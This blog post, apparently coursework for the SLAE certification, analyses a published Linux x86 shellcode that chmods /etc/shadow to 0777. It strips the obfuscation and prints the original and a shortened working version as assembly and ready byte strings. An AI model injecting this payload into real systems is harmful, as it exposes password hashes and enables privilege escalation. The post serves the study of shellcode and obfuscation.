# Overview

The original /etc/shadow permissions are set to 640, so this command will reset permissions back to the default on Ubuntu.
```bash
chmod 640 /etc/shadow
```

Here, I chose this shellcode from [http://shell-storm.org/shellcode/files/shellcode-875.php](http://shell-storm.org/shellcode/files/shellcode-875.php). The note says that it is a bit obfuscated, so I thought it would be interesting to see what this means at an instruction level. I will be removing the obfuscation, so the extra credit shouldn't count for making this one shorter, I just wanted to analyze this piece of assembly to understand some techniques for obfuscation.

# Disassembly

Here is the disassembly commented with my quick notes. I see they are obfuscating the string "adow" and using techniques such as `mov ebx, eax; xor eax, ebx` to perhaps obfuscate an `xor eax, eax`.

```assembly
section .text
global _start

_start: 
    mov ebx, eax
    xor eax, ebx            ; = xor eax, eax
    push dword eax

    ; push obfuscated "adow" string
    mov esi, 0x563a1f3e
    add esi, 0x21354523
    mov dword [esp-4], esi              ; "adow"

    mov dword [esp-8], 0x68732f2f       ; "hs//"
    mov dword [esp-12], 0x6374652f      ; "cte/"
    sub esp, 12
    mov ebx,esp
    
    push word  0x1ff ; permissions 0777
    pop cx

    mov al,0xf  ; chmod()
    int 0x80

```

Shellcode (length: 51 bytes)

```c
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f\x3a\x56\x81\xc6\x23\x45\x35\x21\x89\x74\x24\xfc\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80"
```

# Changes

I start the modifications by just xor'ing and removing the previous mov instruction to set eax to 0x0.

```assembly
; mov ebx, eax
; xor eax, ebx            ; = xor eax, eax
xor eax, eax
```

Next I remove the deobfuscated string, and change the mov instructions to push instructions in order to get the string "/etc//shadow" onto the stack.

```assembly
; ; push obfuscated "adow" string
; mov esi, 0x563a1f3e
; add esi, 0x21354523
; mov dword [esp-4], esi              ; "adow"
; mov dword [esp-8], 0x68732f2f       ; "hs//"
; mov dword [esp-12], 0x6374652f      ; "cte/"
; sub esp, 12
push 0x776f6461         ; "woda"
push 0x68732f2f         ; "hs//"
push 0x6374652f         ; "cte/"
```

The rest of the instructions are the same, however, I also added a call to exit() so the shellcode exits gracefully. Since we can assume the chmod returns the value of 0, I will increment it's value to reference the exit syscall.

```assembly
inc eax
int 0x80
```

# New Disassembly + Shellcode

```assembly
section .text
global _start

_start: 
    ; mov ebx, eax
    ; xor eax, ebx            ; = xor eax, eax
    xor eax, eax
    
    push dword eax

    ; ; push obfuscated "adow" string
    ; mov esi, 0x563a1f3e
    ; add esi, 0x21354523
    ; mov dword [esp-4], esi              ; "adow"
    ; mov dword [esp-8], 0x68732f2f       ; "hs//"
    ; mov dword [esp-12], 0x6374652f      ; "cte/"
    ; sub esp, 12
    push 0x776f6461         ; "woda"
    push 0x68732f2f         ; "hs//"
    push 0x6374652f         ; "cte/"

    mov ebx,esp
    
    push word  0x1ff ; permissions 0777
    pop cx

    mov al,0xf  ; chmod()
    int 0x80

    inc eax
    int 0x80
```

New Shellcoe (Lenth: 33)

```c
"\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80\x40\xcd\x80"
```




# Certification Requirements

This blog post has been created for completing the requirements of the SecurityTube/PentesterAcademy [x86 Assembly Language and Shellcoding on Linux (SLAE)](https://www.pentesteracademy.com/course?id=3) certification:

Student ID: SLAE-alecjmaly

